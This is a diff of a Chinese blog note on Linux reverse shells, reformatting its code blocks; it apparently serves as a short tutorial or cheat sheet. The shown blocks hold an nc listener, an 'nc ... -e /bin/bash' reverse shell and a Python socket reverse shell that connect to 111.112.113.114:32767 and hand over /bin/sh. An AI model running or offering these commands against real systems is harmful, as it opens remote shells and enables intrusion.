@@ -1,7 +1,7 @@
 ---
 title: "Linux 反弹 shell"
 date: "2022-07-11 15:23:00"
-lastmod: "2022-07-21 15:04:10"
+lastmod: "2022-07-24 17:01:38"
 tags: ["shell"]
 categories: ["Linux"]
 draft: false
@@ -32,19 +32,15 @@ draft: false
 
 -   A:
 
-<!--listend-->
-
-```bash
-nc -lvp 32767
-```
+    ```bash
+    nc -lvp 32767
+    ```
 
 -   B:
 
-<!--listend-->
-
-```bash
-nc 111.112.113.114 32767 -e /bin/bash
-```
+    ```bash
+    nc 111.112.113.114 32767 -e /bin/bash
+    ```
 
 
 ### bash {#bash}
@@ -62,17 +58,15 @@ nc 111.112.113.114 32767 -e /bin/bash
 -   A 同上
 -   B:
 
-<!--listend-->
-
-```python
-python -c 'import socket,subprocess,os; \
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("111.112.113.114",32767));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);'
-```
+    ```python
+    python -c 'import socket,subprocess,os; \
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+    s.connect(("111.112.113.114",32767));
+    os.dup2(s.fileno(),0);
+    os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2);
+    p=subprocess.call(["/bin/sh","-i"]);'
+    ```
 
 
 ## Ref {#ref}
